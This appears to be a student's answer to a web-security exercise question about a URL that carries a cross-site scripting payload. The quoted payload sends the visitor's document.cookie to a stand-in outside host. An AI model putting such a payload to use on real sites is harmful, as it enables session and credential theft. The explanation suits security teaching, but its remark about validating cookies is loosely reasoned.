3. What harm could result from the following:
http://www.example.com/search?q=<script>object.src=”http://otherexample.com/code?data=”+document.cookie</script>

This could be considered as a cross-site attack. It's trying to send a cookie data from one site to another one, this could be risky if the is not validated before using it; it's a security issue and each site must be validate the cookie comes from the one it should.

The harm consists in, for example, if the data contained in the cookie is sensitive (personal data, user IDS, passwords, accounts, etc) and this data is sent and captured by a different site with malicious  intentions.


Estimated time to solve this:
30 minutes